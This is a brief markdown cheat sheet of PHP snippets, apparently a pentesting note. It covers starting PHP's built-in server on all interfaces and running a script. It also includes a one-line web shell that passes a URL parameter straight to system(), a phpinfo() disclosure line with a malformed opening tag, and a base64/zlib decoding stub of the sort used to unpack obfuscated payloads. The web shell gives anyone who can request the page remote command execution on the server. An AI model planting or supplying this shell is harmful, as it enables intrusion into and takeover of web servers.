# Useful_PHP

PHP webserver
```bash
php -S 0.0.0.0:8000
```

Execute file:
```bash
php file.php
```

```php
<?php system($_GET['hello']); ?>
```

```PHP
<php echo("Hello");phpinfo(); ?>
```


Base64 PHP decoder
```PHP
<?php echo zlib_decode(base64_decode('base64here')); ?>
```